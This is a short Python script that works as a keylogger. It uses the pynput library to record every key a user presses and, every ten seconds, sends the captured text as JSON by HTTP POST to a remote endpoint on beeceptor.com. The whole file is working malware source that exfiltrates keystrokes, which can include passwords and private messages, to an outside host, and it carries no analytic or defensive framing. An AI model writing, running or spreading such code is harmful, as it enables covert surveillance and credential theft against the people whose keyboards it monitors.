from pynput import keyboard
import json
import requests
import threading

text = ""
interval = 10

addr = "https://mockup.free.beeceptor.com"

def send_post_req():
    # format captured keys and send
    payload = json.dumps({"keyboardData" : text})
    r = requests.post(addr, data=payload, headers={"Content-Type" : "application/json"})
    print(payload)
    # every n seconds send info to the server
    timer = threading.Timer(interval, send_post_req)
    timer.start() 

# event listener for key pressed
def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or key == keyboard.Key.alt:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
